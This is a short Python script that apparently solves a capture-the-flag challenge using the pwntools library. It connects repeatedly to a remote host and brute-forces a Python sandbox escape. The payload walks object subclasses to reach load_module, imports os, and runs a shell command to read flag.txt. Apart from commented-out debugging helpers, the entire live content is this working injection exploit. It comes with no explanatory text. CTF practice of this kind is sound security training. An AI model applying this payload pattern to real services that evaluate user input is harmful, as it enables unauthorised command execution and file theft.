#!/usr/bin/python3

from pwn import *

# exe = ELF('a', checksec=False)

# context.binary = exe

# def GDB():
#         if not args.REMOTE:
#                 gdb.attach(p, gdbscript='''


#                 c
#                 ''')
#                 input()

# info = lambda msg: log.info(msg)
# sla = lambda msg, data: p.sendlineafter(msg, data)
# sa = lambda msg, data: p.sendafter(msg, data)
# sl = lambda data: p.sendline(data)
# s = lambda data: p.send(data)


# GDB()
for i in range(100, 120):
    p = remote('198.199.90.158', 33724)
    payload = "{}.__class__.__base__.__subclasses__()" + f"[{i}]" +'().load_module("os").system("cat flag.txt")'
    p.sendlineafter("list:", payload)
    info = p.recvall()
    print(info)
    p.close()

p.interactive()
